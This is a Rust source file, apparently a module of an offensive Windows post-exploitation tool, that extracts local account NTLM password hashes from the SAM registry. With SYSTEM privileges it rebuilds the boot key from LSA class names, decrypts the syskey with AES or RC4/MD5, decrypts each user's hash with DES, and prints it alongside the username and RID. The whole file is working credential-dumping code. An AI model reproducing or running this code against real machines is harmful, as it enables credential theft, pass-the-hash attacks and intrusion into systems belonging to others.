extern crate des;

use crate::utilities::Utils;

use des::decrypt;

use winreg::enums::*;
use winreg::RegKey;

use winapi::um::winreg::{
    RegQueryInfoKeyA,
    RegOpenKeyExA
};

use winapi::shared::minwindef::{
    HKEY, 
    MAX_PATH
};

use regex::Regex;

use anyhow::{
    anyhow, 
    Result
};

use std::fmt::Write;
use std::io::Error;
use std::ffi::CString;

use aes::Aes128;

use md5::{
    Md5, 
    Digest
};

use block_modes::{
    BlockMode, 
    Cbc
};

use block_modes::block_padding::NoPadding;

type Aes128Cbc = Cbc<Aes128, NoPadding>;

pub struct Ntlm {
    username: String,
    rid: usize,
    hash: String
}

impl Ntlm {
    pub fn grab() -> Result<()> {
        if !Utils::is_elevated() {
            println!("[-] Program requires atleast system permissions");
        } else {
            if Utils::is_system() {
                if let Ok(ntlms) = get_ntlm_hash() {
                    for ntlm in ntlms {
                        println!("{}::{}::{}", ntlm.username, ntlm.rid, ntlm.hash);
                    }
                }
            }
        }
        Ok(())
    }
}

fn get_bootkey(input: String) -> Result<Vec<u8>> {
    let mut bootkey = vec![];

    let class: Vec<char> = input.chars().collect();
    let modulo_numbers = vec![8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7];
    for number in modulo_numbers {
        let number_first = class[number * 2];
        let number_second = class[number * 2 + 1];

        bootkey.push(u8::from_str_radix(format!("{}{}", number_first, number_second).as_str(), 16)?);
    }
    Ok(bootkey)
}

fn get_deskey_key(input: String, modulos: Vec<usize>) -> Result<Vec<u8>> {
    let mut deskey = vec![];

    let class: Vec<char> = input.chars().collect();
    for number in modulos {
        let number_first = class[number * 2];
        let number_second = class[number * 2 + 1];

        deskey.push(u8::from_str_radix(format!("{}{}", number_first, number_second).as_str(), 16)?);
    }
    Ok(deskey)
}

fn get_i32_from_vector(buf: &[u8]) -> i32 {

    let mut buffer = [0u8; 4];
    let mut counter = 0;

    for i in buf.iter() {
        buffer[counter] = *i;
        counter += 1;
    }


    return unsafe{ std::mem::transmute::<[u8; 4], i32>(buffer) };
}

fn vector_str_to_vector_u8(input: Vec<String>) -> Vec<u8> {
    let mut output = vec![];

    for i in input {
        match i.parse::<u8>() {
            Ok(byte) => output.push(byte),
            Err(_) => continue,
        };
    }

    output
}

fn convert_string(input: &[u8]) -> String {
    let mut s = String::with_capacity(2 * input.len());
    for byte in input {
        write!(s, "{:02X}", byte).unwrap();
    }
    s
}

fn get_users() -> Result<Vec<String>> {
    let mut users_vector: Vec<String> = vec![];
    for i in RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SAM\\SAM\\Domains\\Account\\Users")?.enum_keys().map(|x| x.unwrap()) {
        let re = Regex::new(r"^[0-9A-F]{8}$")?;
        if re.is_match(&i) {
            users_vector.push(i);
        }
    }
    Ok(users_vector)
}

fn collect_f_bytes() -> Result<Vec<u8>> {
    let system = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SAM\\SAM\\Domains\\Account")?;
    for (name, value) in system.enum_values().map(|x| x.unwrap()) {
        if name == "F" {
            return Ok(extract_binary_data(value.to_string()));
        }
    }
    return Err(anyhow!("Failed to collect f bytes"));
}

fn collect_v_bytes(user: String) -> Result<Vec<u8>> {
    let location = format!("SAM\\SAM\\Domains\\Account\\Users\\{}", user);
    let system = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(location)?;
    for (name, value) in system.enum_values().map(|x| x.unwrap()) {
        if name == "V" {
            return Ok(extract_binary_data(value.to_string()));
        }
    }
    return Err(anyhow!("Failed to collect v bytes"));
}

fn extract_binary_data(input: String) -> Vec<u8> {

    let first_replace = format!("{:?}", input).replace("F = RegValue(REG_BINARY: [", "");
    let second_replace = format!("{:?}", first_replace).replace("])", "").replace("RegValue(REG_BINARY: [", "").replace(" ", "").replace('"', "").replace("\\[", "").replace("]\\", "");
    let bytes: Vec<String> = second_replace.split(",").map(String::from).collect();

    return vector_str_to_vector_u8(bytes);
}

fn collect_classnames() -> String {
    let keys = vec!["JD", "Skew1", "GBG", "Data"];
    let mut result = String::new();

    for key in keys {
        let hkey = open_regkey(key.to_string());
        result.push_str(read_classname(hkey).as_str());
    }

    return result;
}

fn open_regkey(key: String) -> HKEY {
    unsafe {
        let mut hkey: HKEY = std::mem::zeroed();
        let location = format!("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{}", key);
        let cstring = CString::new(location).unwrap();

        if RegOpenKeyExA(
            0x80000002 as HKEY,
            cstring.as_ptr(),
            0x0,
            0x19,
            &mut hkey,
        ) != 0 {
            println!("{}", Error::last_os_error());
        }

        hkey
    }
}

fn get_bytes_with_null(input: &str) -> Vec<u8> {
    let mut result = input.as_bytes().to_vec();
    result.push(0);
    result
}

fn get_enc_key(input_one: Vec<u8>, input_two: Vec<u8>, input_three: Vec<u8>, input_four: Option<Vec<u8>>) -> Vec<u8> {
    let mut total = Vec::new();

    for i in input_one {
        total.push(i);
    }

    for i in input_two {
        total.push(i);
    }

    for i in input_three {
        total.push(i);
    }

    if let Some(input_four) = input_four {
        for i in input_four {
            total.push(i);
        }
    }

    total
}

fn read_classname(handle: HKEY) -> String {
    unsafe {
        let mut class: [i8; MAX_PATH] = std::mem::zeroed();
        let mut class_size = MAX_PATH as *mut u32;

        if RegQueryInfoKeyA(
            handle,
            class.as_mut_ptr(),
            &mut class_size as *mut _ as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            0 as *mut u32,
            std::mem::zeroed(),
        ) != 0 {
            println!("Error getting classname: {}", Error::last_os_error());
        }
        let u8slice : &[u8] = std::slice::from_raw_parts(class.as_ptr() as *const u8, class.len());
        return std::string::String::from_utf8_lossy(&u8slice).replace("\u{0}", "");
    }
}

fn to_rid(input: String) -> usize {
    if let Ok(result) = usize::from_str_radix(&input, 16) {
        return result;
    }
    return 0;
}

fn transform_to_struct(username: String, rid: usize, hash: String) -> Ntlm {
    Ntlm {
        username: username,
        rid: rid,
        hash: hash,
    }
}

fn unicode_to_string(input: &[u8]) -> String {
    match std::str::from_utf8(&input) {
        Ok(string) => return string.replace("\u{0}", "").to_string(),
        Err(_) => return format!("Failed to decode string"),
    };
}

fn aes_128_cbc_decrypt(key: &[u8], iv: &[u8], input: Vec<u8>) -> Result<Vec<u8>> {
    let cipher = Aes128Cbc::new_from_slices(&key, &iv)?;
    let mut buf = input;
    return Ok(cipher.decrypt(&mut buf)?.to_vec());
}

fn convert_to_u128(input: Vec<u8>) -> Vec<u128> {
    let mut new: Vec<u128> = Vec::new();
    for i in input {
        new.push(i as u128);
    }
    new
}

fn convert_to_u8(input: Vec<u128>) -> Vec<u8> {
    let mut new: Vec<u8> = Vec::new();
    for i in input {
        new.push(i as u8);
    }
    new
}

fn rc4(data: Vec<u128>, key: Vec<u128>) -> Vec<u128> {
    let mut r: Vec<u128> = data;
    let mut s: [u128; 256] = [0u128; 256];
    let mut k: [u128; 256] = [0u128; 256];

    for i in 0..256 {
        s[i] = i as u128;
        k[i] = key[i % key.len()];
    }

    let mut j: u128 = 0;
    for i in 0..256 {
        j = (j + s[i] + k[i]) % 256;
        let temp = s[i];
        s[i] = s[j as usize];
        s[j as usize] = temp;
    }
        
    let mut i = 0;
    let mut j = 0;
    for x in 0..r.len() {
        i = (i + 1) % 256;
        j = (j + s[i as usize]) % 256;

        let temp = s[i as usize];
        s[i as usize] = s[j as usize];
        s[j as usize] = temp;

        let t = ((s[i as usize] + s[j as usize]) % 256) as usize;
        r[x] = r[x] ^ s[t];
    }
    r
}

fn str_to_key(input: Vec<u8>) -> [u8; 8] {
    let mut encoded_key = vec![];
    let mut key = [0u8; 8];  

    let odd_parity = vec![
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254];

    encoded_key.push(bitshift(input[0].into(), -1) as u8);
    encoded_key.push(bitshift((input[0] & 1).into(), 6) as u8 | bitshift(input[1].into(), -2) as u8);
    encoded_key.push(bitshift((input[1] & 3).into(), 5) as u8 | bitshift(input[2].into(), -3) as u8);
    encoded_key.push(bitshift((input[2] & 7).into(), 4) as u8 | bitshift(input[3].into(), -4) as u8);
    encoded_key.push(bitshift((input[3] & 15).into(), 3) as u8 | bitshift(input[4].into(), -5) as u8);
    encoded_key.push(bitshift((input[4] & 31).into(), 2) as u8 | bitshift(input[5].into(), -6) as u8);
    encoded_key.push(bitshift((input[5] & 63).into(), 1) as u8 | bitshift(input[6].into(), -7) as u8);
    encoded_key.push(input[6] & 127);
    key[0] = odd_parity[(bitshift(encoded_key[0].into(), 1)) as usize];
    key[1] = odd_parity[(bitshift(encoded_key[1].into(), 1)) as usize];
    key[2] = odd_parity[(bitshift(encoded_key[2].into(), 1)) as usize];
    key[3] = odd_parity[(bitshift(encoded_key[3].into(), 1)) as usize];
    key[4] = odd_parity[(bitshift(encoded_key[4].into(), 1)) as usize];
    key[5] = odd_parity[(bitshift(encoded_key[5].into(), 1)) as usize];
    key[6] = odd_parity[(bitshift(encoded_key[6].into(), 1)) as usize];
    key[7] = odd_parity[(bitshift(encoded_key[7].into(), 1)) as usize];
    key
}

fn bitshift(input: f64, power: i32) -> f64 {
    return (input * 2_f64.powi(power)).floor();
}

fn get_ntlm_hash() -> Result<Vec<Ntlm>> {

    let mut hashes: Vec<Ntlm> = vec![];

    if let Ok(users) = get_users() {
        for user in users {
            if let Ok(v) = collect_v_bytes(user.clone()) {
                if let Ok(f) = collect_f_bytes() {
                    let class = collect_classnames();

                    let offset = get_i32_from_vector(&v[12..16]) + 204;
                    let len = get_i32_from_vector(&v[16..20]);

                    let username = unicode_to_string(&v[offset as usize..(offset + len) as usize]);

                    let offset = get_i32_from_vector(&v[168..172]) + 204;
                    let bootkey = get_bootkey(class)?;
                    
                    let enc_ntlm = match v[172] {
                        56 => {
                            let encrypted_syskey = &f[136..152];
                            let encrypted_syskey_iv = &f[120..136];
                            let encrypted_syskey_key = bootkey;

                            let syskey = aes_128_cbc_decrypt(&encrypted_syskey_key, &encrypted_syskey_iv, encrypted_syskey.to_vec());

                            let enc_ntlm = &v[offset as usize + 24..offset as usize + 24 + 16];
                            let enc_ntlm_iv = &v[offset as usize + 8..offset as usize + 24];
                            let enc_ntlm_key = syskey?;

                            let enc_ntlm = aes_128_cbc_decrypt(&enc_ntlm_key, &enc_ntlm_iv, enc_ntlm.to_vec());
                            enc_ntlm
                        },
                        20 => {
                            let encrypted_syskey = &f[128..144];
                            let mut hasher = Md5::new();
                            hasher.update(get_enc_key(
                                f[112..128].to_vec(),
                                get_bytes_with_null("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%"),
                                bootkey.to_vec(),
                                Some(get_bytes_with_null("0123456789012345678901234567890123456789"))
                            ));
                            let enc_syskey_key = hasher.finalize();

                            let syskey = rc4(convert_to_u128(encrypted_syskey.to_vec()), convert_to_u128(enc_syskey_key.to_vec()));

                            let enc_ntlm = &v[offset as usize+4..offset as usize+4+16];
                            let mut hasher = Md5::new();
                            hasher.update(get_enc_key(
                                convert_to_u8(syskey),
                                get_deskey_key(user.clone(), vec![3,2,1,0])?,
                                get_bytes_with_null("NTPASSWORD"),
                                None,
                            ));

                            let enc_ntlm_key = hasher.finalize();
                            let enc_ntlm = rc4(convert_to_u128(enc_ntlm.to_vec()), convert_to_u128(enc_ntlm_key.to_vec()));
                            Ok(convert_to_u8(enc_ntlm))
                        },
                        _ => {
                            Ok(vec![])
                        },
                    };

                    if let Ok(enc_ntlm) = enc_ntlm {
                        if !enc_ntlm.is_empty() {

                            let des_str_one = get_deskey_key(user.clone(), vec![3,2,1,0,3,2,1])?;
                            let des_str_two = get_deskey_key(user.clone(), vec![0,3,2,1,0,3,2])?;

                            let des_key_one = str_to_key(des_str_one);
                            let des_key_two = str_to_key(des_str_two);

                            let ntlm1 = decrypt(&enc_ntlm, &des_key_one);
                            let ntlm2 = decrypt(&enc_ntlm, &des_key_two);

                            hashes.push(transform_to_struct(username.to_string(), to_rid(user.clone()), format!("{}{}",convert_string(&ntlm1[..8]), convert_string(&ntlm2[8..]))));
                        } else {
                            hashes.push(transform_to_struct(username.to_string(), to_rid(user.clone()), "31D6CFE0D16AE931B73C59D7E0C089C0".to_string()));
                        }
                    }
                }
            }
        }
    }


    Ok(hashes)
}